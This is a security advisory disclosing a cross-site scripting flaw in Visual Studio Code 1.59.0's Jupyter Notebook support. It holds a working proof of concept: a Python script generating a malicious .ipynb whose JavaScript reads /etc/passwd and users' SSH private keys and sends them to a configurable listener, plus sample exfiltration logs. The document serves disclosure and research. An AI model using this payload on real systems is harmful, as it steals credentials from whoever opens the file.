#  OVE-20210809-0001 Visual Studio Code `.ipynb` Jupyter Notebook XSS (Arbitrary File Read)

Version tested: [1.59.0](https://code.visualstudio.com/updates/v1_59) on Linux

Disclosed: 12 August 2021

<https://twitter.com/justinsteven>

## Overview

Version 1.59.0 of Visual Studio Code introduced built-in support for Jupyter Notebook files (`.ipynb`). While the extension allows for the viewing and editing of Jupyter Notebook files within the editor, the built-in support is primitive and does not allow for execution of notebook cells without installing optional "kernel" extensions.

A malicious Jupyter Notebook file can specify a cell with an output of type `display_data` containing data of MIME type `text/markdown`. This will be rendered as Markdown immediately upon opening the Notebook file, without any further user interaction and without any optional kernel extensions installed. The Markdown data can contain arbitrary HTML and JavaScript which will be rendered in the editor without any meaningful Content Security Policy protections, allowing for XSS in the context of the Electron app.

I could not find a way to leverage this XSS primitive to achieve arbitrary code execution, but someone more skilled with Electron exploitation may be able to do so. I developed a Proof of Concept that reads arbitrary files on disk and leaks their contents to a remote server. The POC first reads `/etc/passwd` to identify home directories on the local file system, and then attempts to read private SSH keys (`.ssh/id_rsa`) from each identified home directory. The contents are then exfiltrated to a given URL.

The POC only requires a user to open the crafted `.ipynb` file within stock Visual Studio Code. No further user interaction is required. The built-in Jupyter Notebook extension opts out of the protections given by the Workspace Trust feature introduced in Visual Studio Code 1.57, and so the user does not need to "Trust" the file or workspace when prompted.

## Eligibility for Azure Bug Bounty Program

[Microsoft's Azure Bug Bounty program](https://www.microsoft.com/en-us/msrc/bounty-microsoft-azure), as of 12 August 2021, says:

> OUT OF SCOPE SUBMISSIONS AND VULNERABILITIES 
>
> Microsoft is happy to receive and review every submission on a case-by-case basis, but some submission and vulnerability types may not qualify for bounty reward. Here are some of the common low-severity or out of scope issues that typically do not earn bounty rewards:  
>
> * [... SNIP ...]
> * Vulnerability patterns or categories for which Microsoft is actively investigating broad mitigations. As of April 2021, for example, these include, without limitation:
>   * Vulnerabilities that rely on VSCode extensions
>   * [... SNIP ...]
> * [... SNIP ...]

I assume that the "broad mitigation" that Microsoft has been investigating is the "Workspace Trust" feature ([Blog post](https://code.visualstudio.com/blogs/2021/07/06/workspace-trust), [Documentation](https://code.visualstudio.com/docs/editor/workspace-trust)) that was included in the 1.57 release. The Workspace Trust feature attempts to disable certain risky functionality until such time as the user opts to trust the opened workspace.

Microsoft have not confirmed to me that Workspace Trust is the "broad mitigation" under investigation. However, Microsoft have recently confirmed that a vulnerability:

* Which is in an extension that is in the core of Visual Studio Code, is installed by default, and which cannot be disabled even using the `--disable-extensions` command-line switch; and
* For which the Workspace Trust feature provides no protection

"Will not be eligible for bounty reward at this time"

The Jupyter Notebook built-in extension [explicitly marks itself as "safe to run" in untrusted workspaces](https://github.com/microsoft/vscode/blob/1ee61f368ee0570feeb220605578a8768d99e762/extensions/ipynb/package.json#L23-L25) as of the time of writing, and hence vulnerabilities within it can be exploited regardless of whether a user chooses to trust the workspace.

The vulnerability described in this document is apparently not eligible under the program.

The vulnerability is disclosed without coordination with Microsoft.

## Proof of Concept

Run the code listed in Appendix A to produce a malicious `.ipynb` notebook which has a JavaScript payload which:

1. Fetches `/etc/passwd` using Visual Studio Code's special <https://file+.vscode-resource.vscode-webview.net> filesystem-reading API
2. Prints the response from 1 to the editor DOM as a demonstration
3. Parses the response from 1 to extract `username:home_directory` pairs
4. For each home directory identified in 3, fetches `${home_directory}/.ssh/id_rsa`, prints its contents to the editor DOM as a demonstration, and phones it home to a given URL (The default being <http://127.0.0.1:4444>)

Note that a more readable copy of the JavaScript payload is shown in Appendix A.

```plain
% ./generate_ipynb.py > poc.ipynb

% cat poc.ipynb
{
  "cells": [
    {
      "cell_type": "code",
      "execution_count": null,
      "source": [],
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "text/markdown": "<img src=x onerror=\"let output = document.createElement('div');output.style.position = 'relative';output.style.left = '40px';output.style.top = '100px';output.style.wordWrap = 'break-word';document.body.appendChild(output);fetch('https://file+.vscode-resource.vscode-webview.net/etc/passwd') .then(response => response.text()) .then(data => { output.innerText += '/etc/passwd: ' + data; output.innerHTML += '<br />'; data.split('\\n').forEach(line => { let components = line.split(':'); let username = components[0]; let homedir = components[5]; fetch('https://file+.vscode-resource.vscode-webview.net' + homedir + '/.ssh/id_rsa') .then(response => response.text()) .then(data => { output.innerText += username + ' id_rsa: ' + data; output.innerHTML += '<br />'; fetch('http://127.0.0.1:4444/' + JSON.stringify({ 'username': username, 'id_rsa': data })); }); }); });\">"
          }
        }
      ]
    }
  ]
}
```

Start a Python webserver at <http://127.0.0.1:4444> to catch the exfiltrated data:

```plain
% cd $(mktemp -d)

% python3 -m http.server 4444
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
```

Open the `.ipynb` file in Visual Studio Code:

```plain
% code -v
1.59.0
379476f0e13988d90fab105c5c19e7abc8b1dea8
x64

% code poc.ipynb
```

Observe that Visual Studio Code opens and it shows the contents of `/etc/passwd` in the editor window, as well as every `id_rsa` file it was able to read. It does so even though the workspace has not been "Trusted to enable all features" (Blue banner at the top) and is in "Restricted mode" (Purple status bar at the bottom).

![Visual Studio Code showing `/etc/passwd` and each readable `.ssh/id_rsa` file](images/2021_vscode_ipynb_xss_arbitrary_file_read/vscode_ipynb_poc.png)

Furthermore, observe that the Python webserver shows the exfiltrated data:

```plain
% python3 -m http.server 4444
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
127.0.0.1 - - [09/Aug/2021 14:37:37] code 404, message File not found
127.0.0.1 - - [09/Aug/2021 14:37:37] "GET /%7B%22username%22:%22root%22,%22id_rsa%22:%22Not%20Found%22%7D HTTP/1.1" 404 -
127.0.0.1 - - [09/Aug/2021 14:37:37] code 404, message File not found
127.0.0.1 - - [09/Aug/2021 14:37:37] code 404, message File not found
127.0.0.1 - - [09/Aug/2021 14:37:37] "GET /%7B%22username%22:%22sys%22,%22id_rsa%22:%22Not%20Found%22%7D HTTP/1.1" 404 -
127.0.0.1 - - [09/Aug/2021 14:37:37] "GET /%7B%22username%22:%22sync%22,%22id_rsa%22:%22Not%20Found%22%7D HTTP/1.1" 404 -
127.0.0.1 - - [09/Aug/2021 14:37:37] code 404, message File not found
127.0.0.1 - - [09/Aug/2021 14:37:37] code 404, message File not found
[... SNIP ...]
127.0.0.1 - - [09/Aug/2021 14:37:37] "GET /%7B%22username%22:%22justin%22,%22id_rsa%22:%22-----BEGIN%20(FAKE)%20OPENSSH%20PRIVATE%20KEY-----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-----END%20OPENSSH%20PRIVATE%20KEY-----/n%22%7D HTTP/1.1" 404 -
[... SNIP ...]
```

## Appendix A - `generate_ipynb.py`

```python
#!/usr/bin/env python3
import json
import re
import sys

# [+] Config
lproto = "http"
lhost = "127.0.0.1"
lport = "4444"

# [+] Payload

# JavaScript payload - leaks readable user .ssh/id_rsa files as a POC
payload = r"""
let output = document.createElement('div');
output.style.position = 'relative';
output.style.left = '40px';
output.style.top = '100px';
output.style.wordWrap = 'break-word';
document.body.appendChild(output);
fetch('https://file+.vscode-resource.vscode-webview.net/etc/passwd')
    .then(response => response.text())
    .then(data => {
        output.innerText += '/etc/passwd: ' + data;
        output.innerHTML += '<br />';
        data.split('\n').forEach(line => {
            let components = line.split(':');
            let username = components[0];
            let homedir = components[5];
            fetch('https://file+.vscode-resource.vscode-webview.net' + homedir + '/.ssh/id_rsa')
                .then(response => response.text())
                .then(data => {
                    output.innerText += username + ' id_rsa: ' + data;
                    output.innerHTML += '<br />';
                    fetch('XXX_LPROTO://XXX_LHOST:XXX_LPORT/' + JSON.stringify({
                        'username': username,
                        'id_rsa': data
                    }));
                });
        });
    });
""".strip().replace("XXX_LPROTO", lproto).replace("XXX_LHOST", lhost).replace("XXX_LPORT", lport)

# Strip newlines
payload = payload.replace("\n", "")

# Replace multiple whitespace chars with one space
payload = re.sub(r"(\s){2,}", r"\1", payload)

# Embed the payload in an onerror handler
payload = f'<img src=x onerror="{payload}">'


def main():
    print(json.dumps({
        "cells": [
            {
                "cell_type": "code",
                "execution_count": None,
                "source": [],
                "outputs": [
                    {
                        "output_type": "display_data",
                        "data": {
                            "text/markdown": payload
                        }
                    }
                ]
            }
        ]
    }, indent=2))


if __name__ == "__main__":
    main()
```